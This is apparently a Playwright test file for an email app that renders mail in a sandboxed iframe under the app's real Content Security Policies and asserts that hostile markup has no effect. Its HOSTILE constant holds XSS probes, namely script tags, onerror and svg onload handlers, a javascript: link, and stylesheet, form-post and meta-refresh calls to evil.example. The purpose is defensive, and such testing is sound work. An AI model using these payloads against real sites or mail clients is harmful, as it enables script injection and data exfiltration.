// The mail frame under the real page policies, in WebKit (campbooks-cloud#199):
// the desktop app's (`src-tauri/tauri.conf.json`) and the web app's
// (`crates/server/src/web.rs`), read from where they are defined so this test
// follows any change to them. The frame is the one the app renders
// (`lib/ui/safe-html/frame.ts`), around the server's own output for the #160
// fixtures (`fixtures/*.html`, kept in step by a Rust test) and around hostile
// markup no sanitiser would let through, to prove the policy and the sandbox
// hold on their own.
//
//   pnpm --filter @campbooks/app exec playwright install webkit
//   pnpm --filter @campbooks/app test:csp
import { Buffer } from "node:buffer";
import { readFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { webkit, type Browser, type Page } from "playwright";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { frameDocument, SANDBOX } from "../../src/lib/ui/safe-html/frame.ts";

const here = path.dirname(fileURLToPath(import.meta.url));
const read = (file: string) => readFileSync(path.join(here, file), "utf8");

/** The desktop app's production policy, as Tauri serves it. */
function desktopPolicy(): string {
  const config = JSON.parse(read("../../src-tauri/tauri.conf.json")) as {
    app: { security: { csp: string } };
  };
  return config.app.security.csp;
}

/** The web app's policy, as the server sends it (`CONTENT_SECURITY_POLICY`). */
function webPolicy(): string {
  const source = read("../../../../crates/server/src/web.rs");
  const found = /CONTENT_SECURITY_POLICY: &str = "([\s\S]*?)";/u.exec(source)?.[1];
  if (found === undefined) {
    throw new Error("CONTENT_SECURITY_POLICY not found in web.rs");
  }
  // A Rust string continued with `\` drops the line break and the indent.
  return found.replaceAll(/\\\n\s*/gu, "");
}

/** A 1×1 PNG, served for every remote image the page lets through. */
const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
  "base64",
);

/**
 * Markup the server's sanitiser removes, kept here on purpose: the frame's
 * policy and sandbox must hold even if it ever let some through.
 */
const HOSTILE = `
<p data-probe style="color: rgb(200, 0, 0); font-weight: 700">Styled by its own attribute</p>
<img data-own src="data:image/png;base64,${PNG.toString("base64")}" width="20" height="20" alt="">
<img src="https://images.example/banner.png" width="40" height="20" alt="banner">
<img src="http://images.example/plain.png" width="40" height="20" alt="plain http">
<div style="background-image: url(https://images.example/attribute-bg.png); width: 10px; height: 10px"></div>
<style>@import url("https://evil.example/import.css"); p { background: url("https://evil.example/style-bg.png") }</style>
<link rel="stylesheet" href="https://evil.example/link.css">
<script>parent.pwned = "script";</script>
<img src="data:," onerror="parent.pwned = 'onerror'" alt="">
<svg onload="parent.pwned = 'svg'"><rect width="1" height="1"></rect></svg>
<a id="script-link" href="javascript:parent.pwned='href'">a script link</a>
<form action="https://evil.example/collect" method="post"><input name="q" value="x"><button id="send">Send</button></form>
<a id="navigate" href="https://evil.example/navigate" target="_self">navigate the frame</a>
<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
`;

/** The page a test opens: the frame, as the app renders it, and nothing else. */
function harness(html: string, remoteImages: boolean): string {
  const srcdoc = frameDocument(html, remoteImages)
    .replaceAll("&", "&amp;")
    .replaceAll('"', "&quot;");
  return `<!doctype html><html><head><meta charset="utf-8"><title>Mail frame</title></head><body style="margin: 0"><iframe id="mail" title="Message" sandbox="${SANDBOX}" referrerpolicy="no-referrer" style="width: 720px; height: 1600px; border: 0" srcdoc="${srcdoc}"></iframe></body></html>`;
}

let browser: Browser;
let server: Server;
let origin: string;
/** What each path serves, and the policy it is served under. */
const pages = new Map<string, { html: string; csp: string }>();

beforeAll(async () => {
  browser = await webkit.launch();
  server = createServer((request, response) => {
    const served = pages.get(request.url ?? "");
    if (served === undefined) {
      response.writeHead(404).end();
      return;
    }
    response
      .writeHead(200, {
        "content-type": "text/html; charset=utf-8",
        "content-security-policy": served.csp,
      })
      .end(served.html);
  });
  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", resolve);
  });
  origin = `http://127.0.0.1:${String((server.address() as AddressInfo).port)}`;
}, 60_000);

afterAll(async () => {
  await browser.close();
  await new Promise((resolve) => server.close(resolve));
});

interface Opened {
  page: Page;
  /** Every URL requested other than the page itself. */
  requested: string[];
  /** Pages the frame opened (popups). */
  popups: Page[];
}

let opened = 0;

/** Open `html` in the frame under `csp`, remote images allowed or not. */
async function open(csp: string, html: string, remoteImages: boolean): Promise<Opened> {
  opened += 1;
  const at = `/mail-${String(opened)}`;
  pages.set(at, { html: harness(html, remoteImages), csp });
  const context = await browser.newContext();
  const requested: string[] = [];
  const popups: Page[] = [];
  context.on("page", (popup) => {
    popups.push(popup);
  });
  // Remote hosts answer from here: nothing leaves the machine, and every
  // request the page lets through is seen.
  await context.route(/^https?:\/\/(?!127\.0\.0\.1)/u, (route) =>
    route.fulfill({ status: 200, contentType: "image/png", body: PNG }),
  );
  const page = await context.newPage();
  page.on("request", (request) => {
    if (!request.url().startsWith(origin)) {
      requested.push(request.url());
    }
  });
  await page.goto(`${origin}${at}`);
  await page.waitForLoadState("load");
  // Late loads (a refresh, a lazy image) get their chance.
  await page.waitForTimeout(1500);
  return { page, requested, popups };
}

/**
 * Evaluate `expression` against the frame's document (`doc`), from the page
 * (same origin), as the app reads it. A script string: this file is
 * type-checked without the DOM types, like the recordings.
 */
function inFrame(page: Page, expression: string): Promise<unknown> {
  return page.evaluate(
    `(() => { const doc = document.getElementById("mail").contentDocument; return ${expression}; })()`,
  );
}

const POLICIES = [
  ["desktop", desktopPolicy()],
  ["web", webPolicy()],
] as const;

describe.each(POLICIES)("the mail frame under the %s policy", (_name, csp) => {
  it("keeps inline style attributes and its own data: images", async () => {
    const { page } = await open(csp, HOSTILE, false);
    expect(await inFrame(page, `getComputedStyle(doc.querySelector("[data-probe]")).color`)).toBe(
      "rgb(200, 0, 0)",
    );
    expect(await inFrame(page, `doc.querySelector("img[data-own]").naturalWidth`)).toBe(1);
    await page.context().close();
  });

  it("loads nothing remote before Show images, style sheets and refreshes included", async () => {
    const { page, requested } = await open(csp, HOSTILE, false);
    expect(requested).toEqual([]);
    await page.context().close();
  });

  it("loads https images after Show images, never style sheets or plain http", async () => {
    const { page, requested } = await open(csp, HOSTILE, true);
    expect(requested).toContain("https://images.example/banner.png");
    expect(requested).toContain("https://images.example/attribute-bg.png");
    expect(requested.filter((url) => url.startsWith("http:"))).toEqual([]);
    expect(requested.filter((url) => url.includes("evil.example"))).toEqual([]);
    await page.context().close();
  });

  it("runs no script: no <script>, onerror, <svg onload> or javascript: link", async () => {
    const { page, popups } = await open(csp, HOSTILE, true);
    await page.frameLocator("#mail").locator("#script-link").click();
    await page.waitForTimeout(800);
    expect(await page.evaluate("window.pwned")).toBeUndefined();
    // A popup the link may have opened ran nothing either (one already gone
    // ran nothing that stayed).
    for (const popup of popups) {
      const pwned: unknown = await popup.evaluate("window.pwned").catch(() => null);
      expect([undefined, null]).toContain(pwned);
    }
    await page.context().close();
  });

  it("posts no form, and neither a link nor a refresh navigates the frame", async () => {
    const { page, requested } = await open(csp, HOSTILE, true);
    const frame = page.frameLocator("#mail");
    await frame.locator("#send").click();
    await frame.locator("#navigate").click();
    await page.waitForTimeout(1500);
    expect(requested.filter((url) => url.includes("evil.example"))).toEqual([]);
    expect(await page.evaluate(`document.getElementById("mail").contentWindow.location.href`)).toBe(
      "about:srcdoc",
    );
    await page.context().close();
  });

  describe.each(["newsletter", "marketing-600", "outlook", "hostile"])(
    "the %s fixture",
    (fixture) => {
      it("renders styled with its images held back", async () => {
        const { page, requested } = await open(csp, read(`fixtures/${fixture}.held.html`), false);
        expect(requested).toEqual([]);
        // The server writes every style as an attribute: some survive.
        expect(await inFrame(page, `doc.querySelectorAll("[style]").length`)).toBeGreaterThan(1);
        await page.context().close();
      });

      it("shows its images once asked or trusted, never a tracker", async () => {
        const { page, requested } = await open(csp, read(`fixtures/${fixture}.shown.html`), true);
        expect(requested.filter((url) => url.includes("track.example"))).toEqual([]);
        await page.context().close();
      });
    },
  );

  it("shows a trusted sender's images (#200), the tracking pixel still gone", async () => {
    const { page, requested } = await open(csp, read("fixtures/marketing-600.shown.html"), true);
    expect(requested).toContain("https://images.example/autumn-banner.jpg");
    const pixels = await open(csp, read("fixtures/hostile.shown.html"), true);
    expect(pixels.requested.filter((url) => url.includes("pixel"))).toEqual([]);
    await page.context().close();
    await pixels.page.context().close();
  });
});
